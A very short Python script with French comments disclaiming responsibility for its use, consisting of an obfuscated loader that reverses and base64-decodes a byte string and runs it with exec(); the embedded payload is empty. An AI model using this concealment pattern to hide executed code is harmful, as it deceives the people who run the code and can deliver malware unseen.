# Créé par MrUser#
#Script Gratuit pour le moment#
#Je ne suis pas responsable de ce que vous allez faire avec ce script#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))